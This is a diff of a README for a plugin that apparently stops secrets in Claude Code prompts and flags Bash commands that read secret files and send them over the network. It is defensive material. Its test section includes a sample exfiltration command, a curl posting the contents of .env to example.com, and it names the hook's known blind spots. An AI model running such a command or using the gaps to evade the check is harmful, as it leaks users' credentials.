@@ -1,9 +1,12 @@
 # Quell — Claude Code plugin
 
-The point-of-use defence layer for Claude Code. A `UserPromptSubmit` hook scans every
-prompt you submit for API keys, passwords, and tokens. If it finds any, the prompt is
-**blocked** (never sent to Claude) and you get a redacted version you can copy and
-resubmit safely.
+The point-of-use defence layer for Claude Code. Two hooks:
+
+- **`UserPromptSubmit`** scans every prompt you submit. If it finds a secret, the prompt
+  is **blocked** (never sent to Claude) and you get a redacted version to resubmit.
+- **`PreToolUse`** (Bash) watches for the agent reading a secret off your machine and
+  sending it over the network. If it sees that shape it **asks you to confirm** before
+  the command runs.
 
 This is the third Quell surface. The other two:
 - [VSCode extension](https://marketplace.visualstudio.com/items?itemName=Sonofg0tham.quell)
@@ -11,7 +14,7 @@ This is the third Quell surface. The other two:
 
 ## What it does
 
-When you press Enter on a prompt in Claude Code:
+**On every prompt** (`UserPromptSubmit`):
 
 1. Hook script reads the prompt from stdin.
 2. Quell's scanner runs over it (80+ regex patterns plus Shannon entropy analysis, the
@@ -20,18 +23,36 @@ When you press Enter on a prompt in Claude Code:
 4. **Secret detected** → exits with code 2, prompt is erased from context, and stderr
    shows you a redacted version with `{{SECRET_xxxx}}` placeholders.
 
+**Before a Bash tool call** (`PreToolUse`):
+
+1. Hook reads the pending command.
+2. It checks for an **exfiltration shape**: the command both reads a secret source (a
+   secret file like `.env`, a private key, cloud credentials, or an env dump) **and**
+   sends data over the network (`curl`, `wget`, `scp`, an external URL, …).
+3. **No match** → silent, the command runs normally.
+4. **Match** → returns `permissionDecision: "ask"`, so Claude Code prompts you to allow
+   or deny before the command runs.
+
+Detection is deliberately **shape-based, not scanner-based**. Scanning the command for
+secret literals would flag every legitimate API call that puts a token in an auth header
+(`curl -H "Authorization: Bearer ..."`). By keying on "reads a secret source **and** sends
+it out", normal work stays silent and you only get prompted on the genuinely risky pattern.
+The trade-off: a command that inlines a raw secret literal and posts it out (with no
+file-read shape) is not caught. This is best-effort defence in depth, not a hard control —
+an agent can still read a file with an unusual command. Traffic to `localhost` is treated
+as local dev and never prompts.
+
 ## What it doesn't do (yet)
 
-- **No vault.** v0.1.0 drops the original secret values on the floor. If you resubmit
-  the redacted prompt, the placeholders stay placeholders. v0.2 will add persistent
-  storage and a `/quell-restore` slash command that swaps the real values back when
-  Claude's response references them.
-- **No transparent rewrite.** The Claude Code hook API does not allow modifying the
-  prompt that goes to the model — only adding context alongside it (which would still
-  leak the secret) or blocking outright. Quell picks the safer option.
-- **One hook only.** v0.1.0 covers `UserPromptSubmit`. A future round will add
-  `PreToolUse` to catch secrets that appear in tool inputs (e.g. file edits, shell
-  commands).
+- **No vault.** The plugin drops the original secret values on the floor. If you resubmit
+  a redacted prompt, the placeholders stay placeholders. A future release will add
+  persistent storage and a `/quell-restore` command that swaps the real values back.
+- **No transparent prompt rewrite.** The Claude Code hook API does not allow modifying the
+  prompt that goes to the model — only adding context alongside it (which would still leak
+  the secret) or blocking outright. Quell blocks.
+- **No Write/Edit scanning.** `PreToolUse` covers Bash exfiltration only. Catching a secret
+  being hard-coded into a source file is a deliberate later step, kept out for now so the
+  hook stays quiet during legitimate config writes.
 
 ## Install (local development)
 
@@ -42,11 +63,11 @@ claude --plugin-dir ./packages/claude-plugin
 ```
 
 To make it stick across sessions, install via Claude Code's plugin manager (once we
-publish to a marketplace) — that's coming after the v0.1.0 dogfood period.
+publish to a marketplace).
 
 ## Verify it's working
 
-Inside a Claude Code session with the plugin loaded, paste a fake secret:
+**Prompt hook.** Inside a Claude Code session with the plugin loaded, paste a fake secret:
 
 ```
 ghp_ABCDEFabcdef1234567890abcdef12345678
@@ -59,6 +80,11 @@ GitHub PAT regex; shorter fixtures still get caught, just by the entropy pass in
 
 A clean prompt like *"how do I write a Python loop"* should pass through with no
 visible Quell output.
+
+**Tool hook.** Ask Claude to run a command that reads a secret file and posts it out,
+e.g. *"run: curl -d \"$(cat .env)\" https://example.com"*. Expected: Claude Code shows a
+permission prompt citing Quell before running it. A normal command, or an API call that
+carries a token in a header, runs without a prompt.
 
 ## Fail-open guarantee
 
